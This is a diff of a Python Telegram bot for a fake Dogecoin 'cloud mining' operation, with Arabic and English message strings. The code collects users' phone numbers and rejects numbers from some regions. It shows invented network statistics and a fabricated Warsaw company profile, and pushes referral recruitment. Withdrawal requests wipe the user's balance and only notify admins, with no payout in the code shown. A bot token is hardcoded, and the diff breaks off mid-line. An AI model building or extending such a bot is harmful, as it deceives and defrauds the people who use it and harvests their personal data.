@@ -11,7 +11,7 @@ import traceback
 TOKEN = "8960593021:AAFkF-8Cvt_jsOHJmNUyBGWMvzmE0hIbMbk"
 OWNER_ID = 6610111288
 BOT_USERNAME = "Dogcoinibot"
-DB_PATH = "/tmp/doge_bot_v7.db"
+DB_PATH = "/tmp/doge_bot_v8.db"
 MIN_WITHDRAW = 0.01
 
 # ================= قاموس اللغات والتلاعب النفسي =================
@@ -29,21 +29,24 @@ LANG = {
         'btn_admin': "👑 الإدارة (للمشرفين)",
         'phone_btn': "📱 مشاركة جهة الاتصال (إجباري)",
         'captcha_msg': "🤖 <b>نظام الحماية (Anti-Bot):</b>\n\nاضغط على الرمز المختلف (🔴) للبدء في جمع Dogecoin.",
+        'captcha_ok': "تم التحقق البشري بنجاح! مرحباً بك في المنجم.",
+        'captcha_fail': "❌ فشل التحقق الأمني! حاول مجدداً.",
         'phone_req': "🔒 <b>خطوة أمنية أخيرة:</b>\n\nلضمان عدم استخدام حسابات وهمية، يرجى مشاركة رقم هاتفك للتوثيق.",
         'phone_err': "❌ عذراً، الأرقام من هذه المنطقة الجغرافية غير مدعومة حالياً.",
         'sub_req': "⚠️ <b>تنبيه أمني!</b>\n\nيجب عليك الاشتراك في قنوات الشركة الرسمية لتفعيل حسابك.",
         'main_menu': "⛏ <b>خوادم التعدين النشطة</b>\n\n💰 الرصيد المباشر: <code>{balance:.8f}</code> <b>DOGE</b>\n⚡ قوة التعدين: <code>{speed:.8f}</code> DOGE/يوم\n👥 أعضاء الفريق: <code>{refs}</code>\n\n<i>🟢 حالة الخادم: متصل ومستقر.</i>",
-        'team_msg': "👥 <b>برنامج الشركاء (Referral):</b>\n\nكل عضو تقوم بدعوته يزيد من سرعة تعدينك بنسبة <b>30%</b> فور إكماله التحقق.\n\n🔗 رابط الدعوة الخاص بك:\n<code>{link}</code>",
+        'team_msg': "👥 <b>برنامج الشركاء (Referral):</b>\n\nكل عضو تقوم بدعوته يزيد من سرعة تعدينك بنسبة <b>30%</b> فور إكماله التحقق والكابتشا.\n\n📊 عدد أعضاء فريقك: <code>{refs}</code>\n🔗 رابط الدعوة الخاص بك:\n<code>{link}</code>",
         'withdraw_err': "❌ رصيدك الحالي أقل من الحد الأدنى للسحب ({min} DOGE).",
         'withdraw_req': "💸 <b>بوابة السحب الآمنة:</b>\nأرسل الآن عنوان محفظة <b>Dogecoin (FaucetPay)</b> الخاصة بك لجدولة الدفعة:",
         'withdraw_done': "✅ <b>تم استلام طلب السحب!</b>\nتم تحويل الطلب لقسم المراجعة المالية، ستصلك الدفعة قريباً.",
+        'ref_notify': "🎉 <b>أخبار ممتازة!</b>\nسجل عضو جديد عبر رابطك وتجاوز الكابتشا بنجاح. تمت زيادة سرعة تعدينك بنسبة 30%!",
         'task_msg': "🔗 <b>المهام الإعلانية:</b>\nاضغط على المهمة، تخطى الإعلانات، ثم انسخ الرمز السري وأرسله هنا:",
         'task_ok': "🎉 <b>عملية ناجحة!</b> تمت إضافة {reward:.8f} DOGE لحسابك.",
         'task_err': "❌ <b>رمز التحقق غير صحيح!</b> يرجى التأكد والمحاولة مجدداً.",
-        'about_text': "🏢 <b>عن شركة DogeCore Solutions:</b>\n\nنحن شركة رائدة في مجال التعدين السحابي، يقع مقرنا الرئيسي في مدينة <b>وارسو، بولندا</b>. نعتمد في عملياتنا على مناخ أوروبا الشرقية البارد لتبريد مزارع خوادم الـ (ASIC) الخاصة بنا، مما يقلل تكاليف التشغيل ويسمح لنا بتقديم عوائد يومية مجانية ومستقرة لمستخدمينا حول العالم.",
+        'about_text': "🏢 <b>عن شركة DogeCore Solutions:</b>\n\nنحن شركة رائدة في التعدين السحابي المؤسسي، يقع مقرنا الرئيسي في <b>وارسو، بولندا</b>. نعتمد في عملياتنا على مناخ أوروبا الشرقية لتبريد مزارع خوادم الـ (ASIC)، مما يقلل تكاليف التشغيل ويسمح لنا بتقديم عوائد يومية مجانية لمستخدمينا حول العالم.",
         'stats_text': "📊 <b>إحصائيات الشبكة المباشرة:</b>\n\n👤 إجمالي عمال التعدين: <code>1,452,890+</code>\n⚡ قوة الهاش الإجمالية: <code>45.2 TH/s</code>\n💸 إجمالي السحوبات (اليوم): <code>12,450 DOGE</code>\n🟢 وقت التشغيل (Uptime): <code>99.98%</code>",
-        'calc_text': "🧮 <b>حاسبة الأرباح المتوقعة:</b>\n\nإذا قمت بدعوة 10 أشخاص = زيادة 300% في سرعة التعدين!\nإذا قمت بدعوة 50 شخص = أرباح يومية قادرة على تحقيق دخل سلبي مستمر.",
-        'support_text': "📞 <b>مركز خدمة العملاء:</b>\n\nنظراً للضغط الهائل من المستخدمين الجدد، قد يستغرق الرد من فريق الدعم من 24 إلى 48 ساعة.\nيرجى التأكد من قراءة قسم (عن الشركة) قبل التواصل.",
+        'calc_text': "🧮 <b>حاسبة الأرباح المتوقعة:</b>\n\nإذا قمت بدعوة 10 أشخاص = زيادة 300% في سرعة التعدين!\nإذا قمت بدعوة 50 شخص = أرباح يومية قادرة على تحقيق دخل سلبي مستمر.\n\n<i>نصيحة: شارك رابطك في منصات التواصل لمضاعفة أرباحك أضعافاً مضاعفة.</i>",
+        'support_text': "📞 <b>مركز خدمة العملاء:</b>\n\nنظراً للضغط الهائل من المستخدمين الجدد، يستغرق الرد من فريق الدعم من 24 إلى 48 ساعة.\nيرجى مراجعة قسم (عن الشركة) أولاً.",
         'admin_panel': "👑 <b>مركز القيادة (المالك والمشرفين):</b>\nاختر العملية المطلوبة لضبط إعدادات النظام:",
     },
     'en': {
@@ -59,26 +62,29 @@ LANG = {
         'btn_admin': "👑 Admin Panel",
         'phone_btn': "📱 Share Contact (Required)",
         'captcha_msg': "🤖 <b>Anti-Bot System:</b>\n\nClick the unique symbol (🔴) to authenticate.",
+        'captcha_ok': "Human verification successful! Welcome to the mine.",
+        'captcha_fail': "❌ Verification failed! Please try again.",
         'phone_req': "🔒 <b>Security Check:</b>\n\nPlease share your phone number to verify your identity.",
         'phone_err': "❌ Registration from your region is currently disabled.",
         'sub_req': "⚠️ <b>Action Required!</b>\n\nYou must join our official channels to activate your miner.",
         'main_menu': "⛏ <b>Active Mining Servers</b>\n\n💰 Live Balance: <code>{balance:.8f}</code> <b>DOGE</b>\n⚡ Hash Power: <code>{speed:.8f}</code> DOGE/Day\n👥 Team Size: <code>{refs}</code>\n\n<i>🟢 Server Status: Online & Stable.</i>",
-        'team_msg': "👥 <b>Partner Program:</b>\n\nEarn a <b>30%</b> mining speed boost for every active referral.\n\n🔗 Your Referral Link:\n<code>{link}</code>",
+        'team_msg': "👥 <b>Partner Program:</b>\n\nEarn a <b>30%</b> mining speed boost for every verified referral.\n\n📊 Team Members: <code>{refs}</code>\n🔗 Your Referral Link:\n<code>{link}</code>",
         'withdraw_err': "❌ Balance is below the minimum threshold ({min} DOGE).",
         'withdraw_req': "💸 <b>Secure Withdrawal:</b>\nSend your <b>Dogecoin (FaucetPay)</b> wallet address to schedule a payout:",
         'withdraw_done': "✅ <b>Request Logged!</b>\nYour payout is under review by our financial team.",
+        'ref_notify': "🎉 <b>Great News!</b>\nA new user joined via your link and completed the captcha. Mining speed increased by 30%!",
         'task_msg': "🔗 <b>Advertising Tasks:</b>\nComplete the link to find the hidden code, then send it here:",
         'task_ok': "🎉 <b>Success!</b> {reward:.8f} DOGE added.",
         'task_err': "❌ <b>Invalid Code!</b> Please try again.",
-        'about_text': "🏢 <b>About DogeCore Solutions:</b>\n\nBased in <b>Warsaw, Poland</b>, we are pioneers in cloud mining. We leverage Eastern Europe's cold climate to naturally cool our ASIC server farms, drastically reducing operational costs.",
+        'about_text': "🏢 <b>About DogeCore Solutions:</b>\n\nBased in <b>Warsaw, Poland</b>, we are pioneers in enterprise cloud mining. We leverage naturally cooled server farms in Eastern Europe to reduce operational costs and deliver steady daily yields worldwide.",
         'stats_text': "📊 <b>Live Network Stats:</b>\n\n👤 Total Miners: <code>1,452,890+</code>\n⚡ Total Hashrate: <code>45.2 TH/s</code>\n💸 Paid Today: <code>12,450 DOGE</code>\n🟢 Uptime: <code>99.98%</code>",
         'calc_text': "🧮 <b>Profit Calculator:</b>\n\nInvite 10 friends = 300% Speed Boost!\nInvite 50 friends = Sustainable passive daily income.",
-        'support_text': "📞 <b>Customer Support:</b>\n\nDue to exceptionally high traffic, our support team may take 24-48 hours to respond. Thank you for your patience.",
+        'support_text': "📞 <b>Customer Support:</b>\n\nDue to exceptionally high traffic, response times are currently 24-48 hours.",
         'admin_panel': "👑 <b>Command Center:</b>\nSelect an administrative action below:",
     }
 }
 
-# ================= الدوال العامة (خارج الكلاس لمنع أخطاء Vercel) =================
+# ================= قاعدة البيانات والدوال العامة المستقلة =================
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
@@ -97,13 +103,20 @@ def init_db():
 def call_api(method, payload):
     api_url = f"https://api.telegram.org/bot{TOKEN}/{method}"
     req = urllib.request.Request(api_url, data=json.dumps(payload).encode('utf-8'), headers={'Content-Type': 'application/json'})
-    try: return json.loads(urllib.request.urlopen(req).read().decode('utf-8'))
-    except: return None
+    try:
+        res = urllib.request.urlopen(req)
+        return json.loads(res.read().decode('utf-8'))
+    except Exception:
+        return None
 
 def send_msg(chat_id, text, markup=None):
     payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
-    if markup: payload["reply_markup"] = markup
-    call_api("sendMessage", payload)
+    if markup:
+        payload["reply_markup"] = markup
+    return call_api("sendMessage", payload)
+
+def delete_msg(chat_id, msg_id):
+    return call_api("deleteMessage", {"chat_id": chat_id, "message_id": msg_id})
 
 def check_sub(user_id, channel_id):
     res = call_api("getChatMember", {"chat_id": channel_id, "user_id": user_id})
@@ -113,7 +126,8 @@ def check_sub(user_id, channel_id):
 
 def get_text(lang, key, **kwargs):
     text = LANG.get(lang, LANG['ar']).get(key, "")
-    if kwargs: text = text.format(**kwargs)
+    if kwargs:
+        text = text.format(**kwargs)
     return text
 
 def get_reply_keyboard(lang, is_admin):
@@ -139,19 +153,20 @@ def update_mining(user_id, cursor, conn):
         cursor.execute("SELECT balance, speed, last_update FROM users WHERE user_id = ?", (user_id,))
         row = cursor.fetchone()
         if row:
-            bal = float(row[0] or 0)
+            bal = float(row[0] or 0.0)
             speed = float(row[1] or 0.0000000115)
             last = int(row[2]) if row[2] else now
             earned = (now - last) * speed
             cursor.execute("UPDATE users SET balance = ?, last_update = ? WHERE user_id = ?", (bal + earned, now, user_id))
             conn.commit()
-    except: pass
+    except Exception:
+        pass
 
-def send_main_menu(chat_id, user_id, cursor, conn, lang, is_admin):
+def send_main_menu(chat_id, user_id, cursor, conn, lang):
     update_mining(user_id, cursor, conn)
     cursor.execute("SELECT balance, speed, ref_count FROM users WHERE user_id = ?", (user_id,))
     row = cursor.fetchone()
-    bal = float(row[0] or 0)
+    bal = float(row[0] or 0.0)
     speed = float(row[1] or 0.0000000115)
     refs = int(row[2] or 0)
     text = get_text(lang, 'main_menu', balance=bal, speed=speed*86400, refs=refs)
@@ -162,215 +177,220 @@ def send_admin_panel(chat_id, lang):
         [{"text": "💰 زيادة رصيد مستخدم", "callback_data": "admin_add_bal"}],
         [{"text": "📢 إذاعة للجميع", "callback_data": "admin_broadcast"}],
         [{"text": "➕ إضافة قناة إجبارية", "callback_data": "add_main_ch"}],
-        [{"text": "🔗 إضافة رابط وكلمة سر", "callback_data": "add_shortlink"}]
+        [{"text": "🔗 إضافة رابط وكلمة سر", "callback_data": "add_shortlink"}],
+        [{"text": "👑 إضافة مشرف فرعي", "callback_data": "admin_add_admin"}]
     ]
     send_msg(chat_id, get_text(lang, 'admin_panel'), {"inline_keyboard": btns})
 
-init_db()
+# ================= معالجة الرسائل العادية =================
+def process_message(msg):
+    chat_id = msg['chat']['id']
+    user_id = msg['from']['id']
+    text = msg.get('text', '')
 
-# ================= المحرك الأساسي (محصن ضد Vercel) =================
-class handler(BaseHTTPRequestHandler):
-    def do_POST(self):
-        try:
-            length = int(self.headers.get('Content-Length', 0))
-            body = self.rfile.read(length)
-            if not body:
-                self.send_response(200)
-                self.end_headers()
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+
+    is_admin = c.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,)).fetchone() is not None
+
+    c.execute("SELECT phone, captcha_time, state, balance, lang, referrer_id FROM users WHERE user_id = ?", (user_id,))
+    user = c.fetchone()
+    now = int(time.time())
+
+    if not user:
+        ref_id = 0
+        if text.startswith("/start ") and text.split(" ")[1].isdigit():
+            ref_id = int(text.split(" ")[1])
+        c.execute("INSERT INTO users (user_id, last_update, referrer_id) VALUES (?, ?, ?)", (user_id, now, ref_id))
+        conn.commit()
+        user = (None, 0, 'idle', 0.0, 'ar', ref_id)
+
+    phone, captcha_time, state, balance, lang, ref_id = user
+    bal_float = float(balance or 0.0)
+
+    # 1. التحقق من رقم الهاتف
+    if not phone:
+        if 'contact' in msg:
+            p = msg['contact'].get('phone_number', '')
+            if not p.startswith('+'):
+                p = '+' + p
+            if re.match(r'^\+(1|3|4|61)', p) and not p.startswith('+7'):
+                send_msg(chat_id, get_text(lang, 'phone_err'), {"remove_keyboard": True})
+                conn.close()
                 return
-                
-            data = json.loads(body.decode('utf-8'))
-            
-            if 'message' in data: 
-                try: self.handle_message(data['message'])
-                except Exception: send_msg(OWNER_ID, f"⚠️ <b>Crash MSG:</b>\n<code>{traceback.format_exc()[-800:]}</code>")
-            elif 'callback_query' in data: 
-                try: self.handle_callback(data['callback_query'])
-                except Exception: send_msg(OWNER_ID, f"⚠️ <b>Crash BTN:</b>\n<code>{traceback.format_exc()[-800:]}</code>")
-                
-        except Exception: pass
-            
-        self.send_response(200)
-        self.end_headers()
+            c.execute("UPDATE users SET phone = ? WHERE user_id = ?", (p, user_id))
+            conn.commit()
+            send_msg(chat_id, "✅", {"remove_keyboard": True})
+            send_captcha(chat_id, lang)
+        else:
+            markup = {"keyboard": [[{"text": get_text(lang, 'phone_btn'), "request_contact": True}]], "resize_keyboard": True}
+            send_msg(chat_id, get_text(lang, 'phone_req'), markup)
+        conn.close()
         return
 
-    def handle_message(self, msg):
-        chat_id = msg['chat']['id']
-        user_id = msg['from']['id']
-        text = msg.get('text', '')
-        
-        conn = sqlite3.connect(DB_PATH)
-        c = conn.cursor()
-        
-        is_admin = c.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,)).fetchone() is not None
+    # 2. فحص الكابتشا الدوري
+    if now - captcha_time > 3600:
+        send_captcha(chat_id, lang)
+        conn.close()
+        return
 
-        c.execute("SELECT phone, captcha_time, state, balance, lang, referrer_id FROM users WHERE user_id = ?", (user_id,))
-        user = c.fetchone()
-        now = int(time.time())
-        
-        if not user:
-            ref_id = 0
-            if text.startswith("/start ") and text.split(" ")[1].isdigit():
-                ref_id = int(text.split(" ")[1])
-            c.execute("INSERT INTO users (user_id, last_update, referrer_id) VALUES (?, ?, ?)", (user_id, now, ref_id))
+    # 3. القنوات الإجبارية
+    c.execute("SELECT url, ch_id FROM channels WHERE type = 'main'")
+    for ch_url, ch_id in c.fetchall():
+        if not check_sub(user_id, ch_id):
+            markup = {"inline_keyboard": [[{"text": "📢 Join / اشترك", "url": ch_url}], [{"text": "✅ Check / تحقق", "callback_data": "check_main_sub"}]]}
+            send_msg(chat_id, get_text(lang, 'sub_req'), markup)
+            conn.close()
+            return
+
+    # 4. معالجة نقرات أزرار الكيبورد السفلي
+    if text == get_text(lang, 'btn_refresh'):
+        send_main_menu(chat_id, user_id, c, conn, lang)
+        conn.close()
+        return
+
+    elif text == get_text(lang, 'btn_lang'):
+        new_lang = 'en' if lang == 'ar' else 'ar'
+        c.execute("UPDATE users SET lang = ? WHERE user_id = ?", (new_lang, user_id))
+        conn.commit()
+        send_msg(chat_id, "🌐 تم تغيير اللغة / Language Updated", get_reply_keyboard(new_lang, is_admin))
+        send_main_menu(chat_id, user_id, c, conn, new_lang)
+        conn.close()
+        return
+
+    elif text == get_text(lang, 'btn_withdraw'):
+        update_mining(user_id, c, conn)
+        c.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
+        current_bal = float(c.fetchone()[0] or 0.0)
+        if current_bal < MIN_WITHDRAW:
+            send_msg(chat_id, get_text(lang, 'withdraw_err', min=MIN_WITHDRAW))
+        else:
+            c.execute("UPDATE users SET state = 'wait_wallet' WHERE user_id = ?", (user_id,))
             conn.commit()
-            user = (None, 0, 'idle', 0.0, 'ar', ref_id)
+            send_msg(chat_id, get_text(lang, 'withdraw_req'))
+        conn.close()
+        return
 
-        phone, captcha_time, state, balance, lang, ref_id = user
-        bal_float = float(balance or 0)
+    elif text == get_text(lang, 'btn_team'):
+        c.execute("SELECT ref_count FROM users WHERE user_id = ?", (user_id,))
+        refs = int(c.fetchone()[0] or 0)
+        link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
+        send_msg(chat_id, get_text(lang, 'team_msg', refs=refs, link=link))
+        conn.close()
+        return
 
-        if not phone:
-            if 'contact' in msg:
-                p = msg['contact'].get('phone_number', '')
-                if not p.startswith('+'): p = '+' + p
-                if re.match(r'^\+(1|3|4|61)', p) and not p.startswith('+7'):
-                    send_msg(chat_id, get_text(lang, 'phone_err'), {"remove_keyboard": True})
-                    return
-                c.execute("UPDATE users SET phone = ? WHERE user_id = ?", (p, user_id))
-                conn.commit()
-                send_msg(chat_id, "✅", {"remove_keyboard": True})
-                send_captcha(chat_id, lang)
-            else:
-                markup = {"keyboard": [[{"text": get_text(lang, 'phone_btn'), "request_contact": True}]], "resize_keyboard": True}
-                send_msg(chat_id, get_text(lang, 'phone_req'), markup)
-            return
-
-        if now - captcha_time > 3600:
-            send_captcha(chat_id, lang)
-            return
-
-        c.execute("SELECT url, ch_id FROM channels WHERE type = 'main'")
-        for ch_url, ch_id in c.fetchall():
-            if not check_sub(user_id, ch_id):
-                markup = {"inline_keyboard": [[{"text": "📢 Join / اشترك", "url": ch_url}], [{"text": "✅ Check / تحقق", "callback_data": "check_main_sub"}]]}
-                send_msg(chat_id, get_text(lang, 'sub_req'), markup)
-                return
-
-        if text == get_text(lang, 'btn_refresh'):
-            send_main_menu(chat_id, user_id, c, conn, lang, is_admin)
-            return
-            
-        elif text == get_text(lang, 'btn_lang'):
-            new_lang = 'en' if lang == 'ar' else 'ar'
-            c.execute("UPDATE users SET lang = ? WHERE user_id = ?", (new_lang, user_id))
-            conn.commit()
-            send_msg(chat_id, "🌐 Language Updated / تم تحديث اللغة", get_reply_keyboard(new_lang, is_admin))
-            send_main_menu(chat_id, user_id, c, conn, new_lang, is_admin)
-            return
-            
-        elif text == get_text(lang, 'btn_withdraw'):
-            update_mining(user_id, c, conn)
-            c.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
-            current_bal = float(c.fetchone()[0] or 0)
-            if current_bal < MIN_WITHDRAW:
-                send_msg(chat_id, get_text(lang, 'withdraw_err', min=MIN_WITHDRAW))
-            else:
-                c.execute("UPDATE users SET state = 'wait_wallet' WHERE user_id = ?", (user_id,))
-                conn.commit()
-                send_msg(chat_id, get_text(lang, 'withdraw_req'))
-            return
-            
-        elif text == get_text(lang, 'btn_team'):
-            c.execute("SELECT ref_count FROM users WHERE user_id = ?", (user_id,))
-            refs = int(c.fetchone()[0] or 0)
-            link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
-            send_msg(chat_id, get_text(lang, 'team_msg', refs=refs, link=link))
-            return
-            
-        elif text == get_text(lang, 'btn_tasks'):
-            c.execute("SELECT id, reward FROM shortlinks")
-            links = c.fetchall()
-            if not links:
-                send_msg(chat_id, "No tasks / لا توجد مهام حالياً")
-                return
-            btns = [[{"text": f"🔗 Task (+{float(l[1] or 0):.8f})", "callback_data": f"do_link_{l[0]}"}] for l in links]
+    elif text == get_text(lang, 'btn_tasks'):
+        c.execute("SELECT id, reward FROM shortlinks")
+        links = c.fetchall()
+        if not links:
+            send_msg(chat_id, "No tasks / لا توجد مهام حالياً")
+        else:
+            btns = [[{"text": f"🔗 Task (+{float(l[1] or 0.0):.8f})", "callback_data": f"do_link_{l[0]}"}] for l in links]
             send_msg(chat_id, get_text(lang, 'task_msg'), {"inline_keyboard": btns})
-            return
+        conn.close()
+        return
 
-        elif text == get_text(lang, 'btn_about'):
-            send_msg(chat_id, get_text(lang, 'about_text'))
-            return
+    elif text == get_text(lang, 'btn_about'):
+        send_msg(chat_id, get_text(lang, 'about_text'))
+        conn.close()
+        return
 
-        elif text == get_text(lang, 'btn_stats'):
-            send_msg(chat_id, get_text(lang, 'stats_text'))
-            return
+    elif text == get_text(lang, 'btn_stats'):
+        send_msg(chat_id, get_text(lang, 'stats_text'))
+        conn.close()
+        return
 
-        elif text == get_text(lang, 'btn_calc'):
-            send_msg(chat_id, get_text(lang, 'calc_text'))
-            return
+    elif text == get_text(lang, 'btn_calc'):
+        send_msg(chat_id, get_text(lang, 'calc_text'))
+        conn.close()
+        return
 
-        elif text == get_text(lang, 'btn_support'):
-            send_msg(chat_id, get_text(lang, 'support_text'))
-            return
-            
-        elif text == get_text(lang, 'btn_admin') and is_admin:
-            send_admin_panel(chat_id, lang)
-            return
+    elif text == get_text(lang, 'btn_support'):
+        send_msg(chat_id, get_text(lang, 'support_text'))
+        conn.close()
+        return
 
-        system_btns = [get_text(lang, k) for k in ['btn_refresh', 'btn_withdraw', 'btn_team', 'btn_tasks', 'btn_lang', 'btn_about', 'btn_stats', 'btn_calc', 'btn_support', 'btn_admin']]
-        
-        if state == 'wait_wallet':
-            if text in system_btns:
-                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
-                conn.commit()
-                return
-                
-            for admin in c.execute("SELECT user_id FROM admins").fetchall():
-                send_msg(admin[0], f"🔔 <b>طلب سحب!</b>\n👤 آيدي: <code>{user_id}</code>\n💰 الرصيد: <code>{bal_float:.8f}</code>\n🏦 المحفظة:\n<code>{text}</code>")
-            
-            c.execute("UPDATE users SET balance = 0, state = 'idle' WHERE user_id = ?", (user_id,))
+    elif text == get_text(lang, 'btn_admin') and is_admin:
+        send_admin_panel(chat_id, lang)
+        conn.close()
+        return
+
+    # 5. معالجة حالات الإدخال النصي
+    system_btns = [get_text(lang, k) for k in ['btn_refresh', 'btn_withdraw', 'btn_team', 'btn_tasks', 'btn_lang', 'btn_about', 'btn_stats', 'btn_calc', 'btn_support', 'btn_admin']]
+
+    if state == 'wait_wallet':
+        if text in system_btns:
+            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
             conn.commit()
-            send_msg(chat_id, get_text(lang, 'withdraw_done'))
+            conn.close()
             return
 
-        elif state.startswith('wait_pass_'):
-            if text in system_btns:
-                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
-                conn.commit()
-                return
+        for admin in c.execute("SELECT user_id FROM admins").fetchall():
+            send_msg(admin[0], f"🔔 <b>طلب سحب عاجل!</b>\n👤 آيدي: <code>{user_id}</code>\n💰 الرصيد: <code>{bal_float:.8f}</code> DOGE\n🏦 المحفظة:\n<code>{text}</code>")
 
-            link_id = int(state.split('_')[2])
-            c.execute("SELECT password, reward FROM shortlinks WHERE id = ?", (link_id,))
-            link = c.fetchone()
-            if link and text.strip() == link[0]:
-                c.execute("UPDATE users SET balance = balance + ?, state = 'idle' WHERE user_id = ?", (float(link[1] or 0), user_id))
-                conn.commit()
-                send_msg(chat_id, get_text(lang, 'task_ok', reward=float(link[1] or 0)))
-            else:
-                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
-                conn.commit()
-                send_msg(chat_id, get_text(lang, 'task_err'))
+        c.execute("UPDATE users SET balance = 0.0, state = 'idle' WHERE user_id = ?", (user_id,))
+        conn.commit()
+        send_msg(chat_id, get_text(lang, 'withdraw_done'))
+        conn.close()
+        return
+
+    elif state.startswith('wait_pass_'):
+        if text in system_btns:
+            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
+            conn.commit()
+            conn.close()
             return
 
-        elif state == 'admin_wait_bal_id' and is_admin:
-            if text in system_btns:
-                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
-                conn.commit()
-                return
-            try:
-                target_id = int(text)
-                c.execute("UPDATE users SET state = ? WHERE user_id = ?", (f'admin_wait_bal_amt_{target_id}', user_id))
-                conn.commit()
-                send_msg(chat_id, f"✅ تم تحديد المستخدم: {target_id}\nأرسل الآن المبلغ المراد إضافته:")
-            except: send_msg(chat_id, "❌ الآيدي غير صحيح.")
-            return
-            
-        elif state.startswith('admin_wait_bal_amt_') and is_admin:
-            if text in system_btns:
-                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
-                conn.commit()
-                return
-            target_id = int(state.split('_')[4])
-            try:
-                amount = float(text)
-                c.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target_id))
-                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
-                conn.commit()
-                send_msg(chat_id, f"✅ تمت الإضافة.")
-                send_msg(target_id, f"🎉 <b>إهداء من الإدارة!</b>\nتمت إضافة <code>{amount:.8f}</code> DOGE إلى رصيدك.")
-            except: send_msg(chat_id, "❌ المبلغ غير صحيح.")
-            return
+        link_id = int(state.split('_')[2])
+        c.execute("SELECT password, reward FROM shortlinks WHERE id = ?", (link_id,))
+        link = c.fetchone()
+        if link and text.strip() == link[0]:
+            c.execute("UPDATE users SET balance = balance + ?, state = 'idle' WHERE user_id = ?", (float(link[1] or 0.0), user_id))
+            conn.commit()
+            send_msg(chat_id, get_text(lang, 'task_ok', reward=float(link[1] or 0.0)))
+        else:
+            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
+            conn.commit()
+            send_msg(chat_id, get_text(lang, 'task_err'))
+        conn.close()
+        return
 
-        if text == "/start":
-            send_msg(chat_id, "✅", get_reply_keyboard(lang, is_admin)) 
-            s
+    elif state == 'admin_wait_bal_id' and is_admin:
+        if text in system_btns:
+            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
+            conn.commit()
+            conn.close()
+            return
+        try:
+            target_id = int(text)
+            c.execute("UPDATE users SET state = ? WHERE user_id = ?", (f'admin_wait_bal_amt_{target_id}', user_id))
+            conn.commit()
+            send_msg(chat_id, f"✅ تم تحديد المستخدم: <code>{target_id}</code>\nأرسل الآن المبلغ المراد إضافته (مثال: 0.5):")
+        except Exception:
+            send_msg(chat_id, "❌ الآيدي غير صحيح.")
+        conn.close()
+        return
+
+    elif state.startswith('admin_wait_bal_amt_') and is_admin:
+        if text in system_btns:
+            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
+            conn.commit()
+            conn.close()
+            return
+        target_id = int(state.split('_')[4])
+        try:
+            amount = float(text)
+            c.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target_id))
+            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
+            conn.commit()
+            send_msg(chat_id, f"✅ تمت إضافة {amount:.8f} DOGE إلى المستخدم بنجاح.")
+            send_msg(target_id, f"🎉 <b>إهداء من الإدارة!</b>\nتمت إضافة <code>{amount:.8f}</code> DOGE إلى رصيدك.")
+        except Exception:
+            send_msg(chat_id, "❌ المبلغ غير صحيح.")
+        conn.close()
+        return
+
+    elif state == 'admin_wait_admin_id' and user_id == OWNER_ID:
+        try:
+            new_admin_id = int(text)
+            c.execute("INSERT OR IGNORE
